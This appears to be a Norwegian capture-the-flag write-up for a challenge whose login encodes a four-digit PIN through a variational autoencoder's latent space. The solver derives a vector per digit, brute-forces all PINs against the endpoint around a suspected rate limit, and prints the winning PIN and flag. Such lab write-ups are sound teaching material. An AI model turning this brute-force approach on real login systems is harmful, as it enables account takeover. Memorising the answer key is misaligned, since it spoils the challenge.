# VAE

Vi har fått tak i et internt dokument fra GooodGames som beskriver en ny metode for innlogging. De har erstattet en vanlig firesifret PIN-kode med kunstig intelligens.

Det ser ut til at de har implementert generativ KI og bruker det som refereres til som "latent spaces" og en Variational Autoencoder.

Vi er ikke helt sikre på hvordan dette fungerer, så du må lese dokumentet og forstå hva som skjer bak kulissene.

Ulike endepunkt som er brukt for login er også beskrevet i dokumentet.

https://vae-login.ctf.cybertalent.no

---

Startet med å brute force så jeg kunne få en vektor for hvert tall, så jeg senere kan brute force med disse vektorene for å teste alle 10000 PINs.\
Innså senere at det ikke var nødvendig å få en god score for hvert tall, så lenge det scoret høyere enn de andre sifrene.


```sh
python3 getVectors.py
best_vectors = {
    '0': [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 3, 0.0, 0.0, 0.0, 0.0, 0.0, 2, 0.0],  # score=19.28, dims=[(12, 3), (18, 2)]
    '1': [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 2, 0.0, -3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0],  # score=11.12, dims=[(10, 2), (12, -3)]
    '2': [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, -3, 3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0],  # score=16.74, dims=[(9, -3), (10, 3)]
    '3': [0.0, 0.0, 0.0, 0.0, -3, 0.0, 0.0, 0.0, 0.0, 3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0],  # score=11.35, dims=[(4, -3), (9, 3)]
    '4': [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, -3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, -3, 0.0],  # score=15.89, dims=[(10, -3), (18, -3)]
    '5': [0.0, 3, 0.0, 0.0, 0.0, 0.0, -3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0],  # score=19.07, dims=[(1, 3), (6, -3)]
    '6': [0.0, 0.0, 0.0, 0.0, 2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 3],  # score=14.46, dims=[(4, 2), (19, 3)]
    '7': [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, -3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, -3],  # score=12.59, dims=[(10, -3), (19, -3)]
    '8': [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, -3, 0.0, 0.0, 0.0, 0.0, -3, 0.0, 0.0, 0.0],  # score=14.59, dims=[(11, -3), (16, -3)]
    '9': [0.0, 0.0, 3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, -3, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0],  # score=11.23, dims=[(2, 3), (10, -3)]
}
```

Stoppet på 3724 forrige run, sikkert rate limited eller noe...
```sh
/cybertalent/2_Oppdrag/2.10_VAE$ python3 bruteforce.py
Brute-forcing alle 4-sifrede PIN-koder...
============================================================
Testet 500 PINs siden 3724... (nå: 4223)
Testet 1000 PINs siden 3724... (nå: 4723)
Testet 1500 PINs siden 3724... (nå: 5223)
Testet 2000 PINs siden 3724... (nå: 5723)

*** SUKSESS med PIN 5853! ***
Code Correct! Flag: 3a14605d2d880aa70b2c6e0631af3c6d
```

Flagget er 3a14605d2d880aa70b2c6e0631af3c6d
